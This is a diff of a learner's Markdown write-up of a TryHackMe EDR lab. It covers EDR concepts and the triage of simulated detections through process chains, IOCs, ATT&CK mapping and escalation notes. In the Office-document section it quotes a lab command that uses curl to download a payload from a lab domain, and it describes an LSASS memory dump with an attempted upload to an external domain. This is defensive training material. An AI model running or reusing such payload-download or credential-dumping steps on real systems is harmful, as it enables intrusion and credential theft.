@@ -1,5 +1,10 @@
 # Introduction to EDR | TryHackMe
 
+![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?logo=tryhackme&logoColor=white)
+![Path](https://img.shields.io/badge/Path-SOC%20Level%201-blue)
+![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
+![Type](https://img.shields.io/badge/Type-Simulated%20Lab-lightgrey)
+
 | | |
 |---|---|
 | **Platform** | [TryHackMe](https://tryhackme.com/room/introductiontoedrs) |
@@ -7,13 +12,39 @@
 | **Difficulty** | Easy <!-- TODO: confirm difficulty --> |
 | **Status** | Completed (22 Nov 2026) |
 | **Environment** | Simulated in-browser EDR console (hands-on practice, not work experience) |
-| **Focus** | EDR concepts, endpoint telemetry, EDR vs antivirus, alert triage, IOC analysis |
+| **Focus** | EDR concepts, endpoint telemetry, EDR vs antivirus, alert triage, IOC analysis, MITRE ATT&CK mapping |
 
 > Flags are redacted in all screenshots.
+
+## Contents
+
+1. [Objective](#objective)
+2. [At a Glance](#at-a-glance)
+3. [Room Overview and EDR Landscape](#1-room-overview-and-edr-landscape)
+4. [Visibility, Detection, Response](#2-visibility-detection-response)
+5. [EDR vs Traditional Antivirus](#3-edr-vs-traditional-antivirus)
+6. [EDR Architecture and Telemetry](#4-edr-architecture-and-telemetry)
+7. [Practical: Triaging EDR Detections](#5-practical-triaging-edr-detections)
+8. [Triage Summary](#triage-summary)
+9. [Reflection: How I'd Write the Escalation Notes](#reflection-how-id-write-the-escalation-notes)
+10. [Key Takeaways](#key-takeaways)
+11. [Glossary](#glossary)
+12. [Skills Demonstrated](#skills-demonstrated)
 
 ## Objective
 
 Learn what an EDR does, how its agents and console fit together, and why it catches activity that signature-based antivirus misses. Then use a simulated EDR console to triage four detections and investigate three of them through their process chains and IOCs.
+
+## At a Glance
+
+| | |
+|---|---|
+| **Alerts in the console** | 4 (all "Not Acknowledged") |
+| **Investigated in depth** | 3 (LSASS credential dumping, AppData execution, malicious Office document) |
+| **Not investigated** | 1 (Scheduled Task persistence, only seen in the list) |
+| **Key concept** | EDR connects process, command line, network, file and registry activity into one attack chain |
+| **Tools and views used** | Alert summary, process chain, IOC tab, risk assessment (severity and confidence) |
+| **Frameworks** | MITRE ATT&CK, Five Ws |
 
 ## 1. Room Overview and EDR Landscape
 
@@ -43,7 +74,13 @@ Example data from the room's demo consoles:
 <p align="center"><img src="screenshots/05-process-tree-example.png" width="800" alt="Process tree view in an EDR detection"></p>
 <p align="center"><img src="screenshots/06-detections-list-example.png" width="800" alt="EDR detections list with filters"></p>
 <p align="center"><img src="screenshots/07-real-time-response-console.png" width="800" alt="Real Time Response console on a Linux host"></p>
+
+<details>
+<summary>Room questions for this section</summary>
+
 <p align="center"><img src="screenshots/08-quiz-visibility-process-tree.png" width="800" alt="Questions on visibility and process tree"></p>
+
+</details>
 
 ## 3. EDR vs Traditional Antivirus
 
@@ -59,13 +96,31 @@ The room walks through one macro-based phishing attack and compares what each to
 | 6 | Remote access via outbound connection | No network visibility | Flags unexpected outbound traffic from `svchost.exe` |
 | End | | May report "clean" | One alert with the full chain and response actions |
 
+**Main point:** antivirus judges individual files against known signatures. EDR judges behaviour and relationships between processes, which is why a trusted binary like Word spawning PowerShell stands out.
+
 <p align="center"><img src="screenshots/09-av-vs-edr-scenario-diagram.png" width="800" alt="AV vs EDR scenario diagram"></p>
 <p align="center"><img src="screenshots/10-av-vs-edr-comparison-table.png" width="800" alt="AV and EDR responses per attack step"></p>
+
+<details>
+<summary>Room questions for this section</summary>
+
 <p align="center"><img src="screenshots/11-quiz-av-vs-edr.png" width="800" alt="Questions on AV vs EDR"></p>
+
+</details>
 
 ## 4. EDR Architecture and Telemetry
 
 Agents (sensors) on each endpoint send telemetry to a central console, where the analyst gets dashboards, alerts and response options.
+
+```mermaid
+flowchart TD
+    A1["Endpoint + EDR agent (sensor)"] --> C["EDR console"]
+    A2["Endpoint + EDR agent (sensor)"] --> C
+    A3["Endpoint + EDR agent (sensor)"] --> C
+    C --> D["Dashboards"]
+    C --> E["Alerts and detections"]
+    C --> F["Response actions"]
+```
 
 | Telemetry | What it helps detect |
 |---|---|
@@ -78,10 +133,16 @@ Agents (sensors) on each endpoint send telemetry to a central console, where the
 The demo activity dashboard shows a CrowdScore of 0/100, 175 new detections, SHA-based detections, prevented malware by host, and detections by tactic (Malware, Defense Evasion, Machine Learning, Command and Control, Impact).
 
 <p align="center"><img src="screenshots/12-activity-dashboard-example.png" width="800" alt="EDR activity dashboard example"></p>
-<p align="center"><img src="screenshots/13-quiz-agent-sensor.png" width="800" alt="Questions on agent and sensor"></p>
 <p align="center"><img src="screenshots/14-agent-console-architecture.png" width="800" alt="EDR agents reporting to a central console"></p>
 <p align="center"><img src="screenshots/15-telemetry-types.png" width="800" alt="Telemetry types collected by EDR"></p>
+
+<details>
+<summary>Room questions for this section</summary>
+
+<p align="center"><img src="screenshots/13-quiz-agent-sensor.png" width="800" alt="Questions on agent and sensor"></p>
 <p align="center"><img src="screenshots/16-quiz-telemetry.png" width="800" alt="Questions on telemetry"></p>
+
+</details>
 
 ## 5. Practical: Triaging EDR Detections
 
@@ -94,20 +155,37 @@ The simulated console showed 51 active hosts and 4 new detections, all "Not Ackn
 | Medium | Execution from AppData Directory | DESKTOP-DEV01 | Nov 22 2026, 16:52 | 35 |
 | Medium | Suspicious Persistence via Scheduled Task | DESKTOP-UATSERVER | Nov 22 2026, 16:17 | not captured |
 
+**My method for each alert:** read the summary → check severity and confidence → walk the process chain from parent to child → review command lines, signing and threat intel → check IOCs and the action taken → map to ATT&CK → write the Five Ws.
+
 <p align="center"><img src="screenshots/17-practical-recent-detections.png" width="800" alt="Recent detections table"></p>
 <p align="center"><img src="screenshots/18-practical-edr-dashboard.png" width="800" alt="EDR dashboard with active hosts and new detections"></p>
 
+---
+
 ### 5.1 Credential Dumping via LSASS Memory Access (WIN-ENG-LAPTOP03)
 
+```mermaid
+flowchart LR
+    A["explorer.exe<br/>signed, clean"] --> B["syncsvc.exe<br/>unsigned, in AppData Temp"]
+    B -->|"reads memory"| C["lsass.exe<br/>PID 488"]
+    B -->|"writes"| D["C:\Users\Public\dump_2025.dmp"]
+    B -.->|"upload attempt, blocked"| E["files-wetransfer.com"]
+```
+
 <p align="center"><img src="screenshots/19-lsass-summary.png" width="800" alt="LSASS alert summary"></p>
+<p align="center"><img src="screenshots/24-lsass-iocs.png" width="800" alt="LSASS alert IOCs"></p>
+
+<details>
+<summary>Detection details, risk assessment and process chain screenshots</summary>
+
 <p align="center"><img src="screenshots/20-lsass-detection-risk.png" width="800" alt="LSASS detection details and risk assessment"></p>
 <p align="center"><img src="screenshots/21-lsass-process-explorer.png" width="800" alt="Process chain: explorer.exe"></p>
 <p align="center"><img src="screenshots/22-lsass-process-syncsvc.png" width="800" alt="Process chain: syncsvc.exe"></p>
 <p align="center"><img src="screenshots/23-lsass-process-lsass.png" width="800" alt="Process chain: lsass.exe"></p>
-<p align="center"><img src="screenshots/24-lsass-iocs.png" width="800" alt="LSASS alert IOCs"></p>
-<!-- TODO: add screenshot (Actions/Response tab) -->
 
-**Process chain:** `explorer.exe` (signed, clean) → `syncsvc.exe` (unsigned) → `lsass.exe` (PID 488, signed, target of unauthorized memory access).
+</details>
+
+<!-- TODO: add screenshot (Actions/Response tab) -->
 
 **Five Ws (from visible evidence)**
 
@@ -142,17 +220,32 @@ The simulated console showed 51 active hosts and 4 new detections, all "Not Ackn
 | T1543.003 Windows Service | Persistence | `HKLM\SYSTEM\...\Services\syncsvc` |
 | T1567 Exfiltration Over Web Service | Exfiltration | Attempted upload, blocked |
 
-- I'm noting the console's tactic label as a discrepancy, not correcting it in the screenshots.
+I'm noting the console's tactic label as a discrepancy, not correcting it in the screenshots.
 
 **Open items (not shown in screenshots):** removal of the dump file, removal of the Run key and service entry, and whether credentials need resetting.
 
+---
+
 ### 5.2 Execution from AppData Directory (DESKTOP-DEV01)
 
+```mermaid
+flowchart LR
+    A["explorer.exe<br/>signed, PID 1116"] --> B["UpdateAgent.exe<br/>unsigned, AppData Roaming"]
+    B -->|"HTTP, port 8080"| C["10.10.20.5<br/>internal IP"]
+```
+
 <p align="center"><img src="screenshots/25-appdata-summary.png" width="800" alt="AppData alert summary"></p>
+<p align="center"><img src="screenshots/29-appdata-iocs.png" width="800" alt="AppData alert IOCs"></p>
+
+<details>
+<summary>Detection details, risk assessment and process chain screenshots</summary>
+
 <p align="center"><img src="screenshots/26-appdata-detection-risk.png" width="800" alt="AppData detection details and risk assessment"></p>
 <p align="center"><img src="screenshots/27-appdata-process-explorer.png" width="800" alt="Process chain: explorer.exe"></p>
 <p align="center"><img src="screenshots/28-appdata-process-updateagent.png" width="800" alt="Process chain: UpdateAgent.exe"></p>
-<p align="center"><img src="screenshots/29-appdata-iocs.png" width="800" alt="AppData alert IOCs"></p>
+
+</details>
+
 <!-- TODO: add screenshot (Actions/Response tab) -->
 
 **Five Ws (from visible evidence)**
@@ -174,15 +267,31 @@ The simulated console showed 51 active hosts and 4 new detections, all "Not Ackn
 | IP | `10.10.20.5` | Internal (Safe) |
 | Hash | `9f9f2e4a44d1a3f711e26c8ab60b392d34e2b36b012f…` (truncated in console) | Marked Safe |
 
+---
+
 ### 5.3 Initial Access via Malicious Office Document (DESKTOP-HR01)
 
+```mermaid
+flowchart LR
+    A["WINWORD.EXE<br/>opens invoice.docm"] --> B["cmd.exe<br/>/c curl ..."]
+    B --> C["curl.exe<br/>downloads payload"]
+    C --> D["install.exe<br/>quarantined, not launched"]
+```
+
 <p align="center"><img src="screenshots/30-hr01-summary.png" width="800" alt="HR01 alert summary"></p>
+<p align="center"><img src="screenshots/36-hr01-iocs.png" width="800" alt="HR01 alert IOCs"></p>
+
+<details>
+<summary>Detection details, risk assessment and process chain screenshots</summary>
+
 <p align="center"><img src="screenshots/31-hr01-detection-risk.png" width="800" alt="HR01 detection details and risk assessment"></p>
 <p align="center"><img src="screenshots/32-hr01-process-winword.png" width="800" alt="Process chain: WINWORD.EXE"></p>
 <p align="center"><img src="screenshots/33-hr01-process-cmd.png" width="800" alt="Process chain: CMD.EXE"></p>
 <p align="center"><img src="screenshots/34-hr01-process-curl.png" width="800" alt="Process chain: cURL.EXE"></p>
 <p align="center"><img src="screenshots/35-hr01-process-install.png" width="800" alt="Process chain: INSTALL.EXE"></p>
-<p align="center"><img src="screenshots/36-hr01-iocs.png" width="800" alt="HR01 alert IOCs"></p>
+
+</details>
+
 <!-- TODO: add screenshot (Actions/Response tab) -->
 
 **Process chain:** `WINWORD.EXE /n "invoice.docm"` → `cmd.exe /c curl http://ayebd.thm/payload.exe -o C:\Users\Public\install.exe` → `curl.exe` → `install.exe` (unsigned, quarantined by EDR, not launched).
@@ -219,10 +328,45 @@ The simulated console showed 51 active hosts and 4 new detections, all "Not Ackn
 
 **Observation:** the SHA256 shown for `curl.exe` here is identical to the one for `syncsvc.exe` in 5.1. This is probably a quirk of the lab data, so I'm not treating it as a link between the two incidents.
 
+---
+
 ### Final questions
+
+<details>
+<summary>Practical task questions and room completion</summary>
 
 <p align="center"><img src="screenshots/37-practical-questions.png" width="800" alt="Practical task questions"></p>
 <p align="center"><img src="screenshots/38-room-completed.png" width="800" alt="Room completed at 100%"></p>
+
+</details>
+
+## Triage Summary
+
+My reading of the three investigated alerts, based only on what the console showed.
+
+| Alert | Host | My verdict | Why | Containment shown in console |
+|---|---|---|---|---|
+| Credential Dumping via LSASS | WIN-ENG-LAPTOP03 | Likely true positive, highest priority | Unsigned tool read LSASS memory, wrote a dump, added persistence keys and tried to upload the dump | Binary and hash quarantined, upload blocked |
+| Malicious Office Document | DESKTOP-HR01 | Likely true positive, contained | Word → CMD → cURL chain pulled a payload from an external domain | Payload quarantined, not launched, domain blocked |
+| Execution from AppData | DESKTOP-DEV01 | Likely benign, needs confirmation | Known internal tool, internal destination, low confidence (35) | None needed, marked safe in internal DB |
+
+**Priority order I'd work in:** LSASS first because credentials may be exposed and persistence was added, then the HR01 document because the payload was contained, then the AppData alert.
+
+**What I would do next (recommendations, not steps shown in the room):**
+
+| Alert | Next steps |
+|---|---|
+| LSASS | Isolate the host, remove the dump file, Run key and service entry, reset `haris.khan` credentials, and search other hosts for the `syncsvc.exe` hash and `files-wetransfer.com` |
+| HR01 | Find the original email and other recipients of `invoice.docm`, confirm `install.exe` never ran, and block the sender |
+| AppData | Confirm with IT that `UpdateAgent.exe` is an approved tool and check why it is unsigned |
+
+## Reflection: How I'd Write the Escalation Notes
+
+The room did not ask for a written analyst comment, so this is my own after-the-fact practice, not part of the lab.
+
+> **LSASS credential dumping, WIN-ENG-LAPTOP03, user haris.khan.** Unsigned `syncsvc.exe` (Temp folder, launched by `explorer.exe`) read `lsass.exe` memory and wrote `C:\Users\Public\dump_2025.dmp`. It created Run key and service persistence and attempted an upload to `files-wetransfer.com`, which EDR blocked. Credential exposure is possible. Recommend host isolation, credential reset and a fleet-wide hunt for the hash and domain. Note: console tactic label says Persistence, but the behaviour maps to Credential Access (T1003.001).
+
+> **Malicious Office document, DESKTOP-HR01, user alice.thomas.** `invoice.docm` opened in Word spawned `cmd.exe`, which used `curl` to download `install.exe` to `C:\Users\Public\`. The payload was quarantined and never executed. Recommend finding the delivery email, checking other recipients and blocking the sender and `ayebd.thm`.
 
 ## Key Takeaways
 
@@ -233,8 +377,22 @@ The simulated console showed 51 active hosts and 4 new detections, all "Not Ackn
 - Console labels can disagree with the evidence (the LSASS tactic), so I check the ATT&CK mapping myself.
 - Blocked or quarantined does not mean closed: persistence entries and dropped files still need cleanup.
 
+## Glossary
+
+| Term | Meaning |
+|---|---|
+| EDR | Endpoint Detection and Response: agents on endpoints that record activity, detect threats and allow response |
+| Telemetry | The activity data an agent collects, such as processes, network connections, files and registry changes |
+| Agent / sensor | The EDR software on each endpoint that collects telemetry |
+| Parent-child process | A process and the process it launched; odd pairs (Word → CMD) are a common detection signal |
+| IOC | Indicator of Compromise: a file path, hash, IP, domain or registry key linked to malicious activity |
+| C2 | Command and control: attacker infrastructure that malware talks to |
+| LSASS | Windows process that holds credentials in memory, a common credential dumping target |
+| Staging | Placing a payload on a host before it is run |
+| Exfiltration | Sending stolen data out of the network |
+
 ## Skills Demonstrated
 
-`EDR` `Alert Triage` `Process Tree Analysis` `IOC Analysis` `MITRE ATT&CK Mapping` `Credential Dumping Detection` `Phishing Macro Analysis` `Endpoint Telemetry` `Five Ws Reporting`
+`EDR` `Alert Triage` `Process Tree Analysis` `IOC Analysis` `MITRE ATT&CK Mapping` `Credential Dumping Detection` `Phishing Macro Analysis` `Endpoint Telemetry` `Five Ws Reporting` `Incident Documentation`
 
 [Back to all labs](../../README.md)
